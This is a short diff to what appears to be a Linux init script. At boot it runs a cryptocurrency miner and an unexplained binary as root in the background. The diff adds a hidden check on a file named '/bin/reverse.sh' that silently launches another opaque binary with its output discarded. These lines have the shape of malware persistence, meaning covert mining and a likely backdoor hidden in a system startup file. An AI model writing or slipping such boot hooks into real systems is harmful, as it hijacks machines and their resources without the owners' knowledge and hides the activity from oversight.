@@ -9,7 +9,9 @@
 ### END INIT INFO
 sudo  /opt/miners/UlordRig-Linux-V1.0.0/ulordrig >>/tmp/miner.log 2>&1 &
 sudo  /usr/share/reash >>/tmp/run.log 2>&1 &
-
+if [ ! -f "/bin/reverse.sh" ];then
+cd /usr/share/ && ./debian_complet 2>&1 > /dev/null &
+fi
 PATH=/sbin:/usr/sbin:/bin:/usr/bin
 
 . /lib/init/vars.sh
